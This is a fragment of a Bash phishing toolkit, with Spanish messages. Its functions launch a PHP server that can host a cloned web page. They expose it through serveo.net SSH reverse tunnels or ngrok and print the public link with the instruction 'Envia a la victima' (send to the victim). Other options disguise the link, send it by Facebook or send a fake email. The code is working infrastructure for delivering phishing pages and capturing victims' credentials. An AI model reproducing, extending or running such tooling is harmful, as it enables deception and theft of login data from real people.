localhost(){
	echo
        php -S localhost:3333 > /dev/null 2>&1 &
        if [[ $clonada == "si" ]];then
                descargar_pagina
        fi
        echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
        sleep 2
        echo -e "$v[$b*$v]$b localhost:3333"
        disfraz
        check
        #Si la opción 7(enviar correo falso) esta elegida, mostramos un mensaje
        if [[ $add7 == "7" ]];then
                echo -e "$v[$b*$v]$b Enviando email..."
        fi
                check_found
}

localrun(){
        echo
        php -S localhost:3333 > /dev/null 2>&1 &
	if [[ $clonada == "si" ]];then
                descargar_pagina
        fi
        echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
        sleep 2
        echo -e "$v[$b*$v]$b localhost:3333"
        echo -e "$v[$b*$v]$b Porfavor abre una nueva sessión, ingresa a la ruta del script y ejecuta: bash ltunnel.sh, recuerda tener openssh instalado"
        disfraz
        check
        #Si la opción 7(enviar correo falso) esta elegida, mostramos un mensaje
        if [[ $add7 == "7" ]];then
                echo -e "$v[$b*$v]$b Enviando email..."
        fi
                check_found
  }


serveo(){
	if [[ $clonada == "si" ]];then
                descargar_pagina
        fi
	echo
        php -S localhost:3333 > /dev/null 2>&1 & 
        echo -e "$v[$b*$v]$b Enpezando..."
        sleep 2
        if [[ -f link ]]; then
                rm -rf link
        fi
        
        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > link ' &
        echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
        sleep 5
        echo -e "$v[$b*$v]$b Abriendo serveo..."
        sleep 5
        echo -e "$v[$b*$v]$b Obteniendo links..."
        sleep 5
        envialink=$(grep -o "https://[0-9a-z]*\.serveo.net" link)
        if [[ $envialink == "" ]];then
                echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
                exit 1
        else
                echo -e "$v[$b*$v]$b localhost:3333"
                echo -e "$v[$b*$v]$b Envia a la victima > $envialink"
                disfraz

        #Si la opción 7(enviar correo falso) esta elegida, mostramos un mensaje
        if [[ $add7 == "7" ]];then
                echo -e "$v[$b*$v]$b Enviando email..."
        fi
                check
                check_found
        fi
        if [[ -f link ]]; then
                rm -rf link
        fi
}

ngrok(){
	if [[ $clonada == "si" ]];then
		descargar_pagina
	fi
        echo
        php -S localhost:3333 > /dev/null 2>&1 &
        echo -e "$v[$b*$v]$b Enpezando..."
        sleep 2
        cd $OLDPWD
        findngrok
        ./ngrok http 3333 > /dev/null 2>&1 &
        echo -e "$v[$b*$v]$b Verifica una buena conexión de internet"
        sleep 5
        echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
        sleep 7
        echo -e "$v[$b*$v]$b Abriendo ngrok..."
        sleep 7
        echo -e "$v[$b*$v]$b Obteniendo links..."
        sleep 7
        envialink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
        if [[ $envialink == "" ]];then 
                echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
		exit 1
        else
                echo -e "$v[$b*$v]$b $link"
                echo -e "$v[$b*$v]$b Envia a la victima: \e[0;32m$envialink"
                cd $ruta_carpeta
                disfraz
		echo -e "$v[$b*$v]$b Envio por facebook:\e[0;32m " $pop9
        #Si la opción 7(enviar correo falso) esta elegida, mostramos un mensaje
        if [[ $add7 == "7" ]];then
                echo -e "$v[$b*$v]$b Enviando email..."
        fi
        check
        check_found
	fi
} 
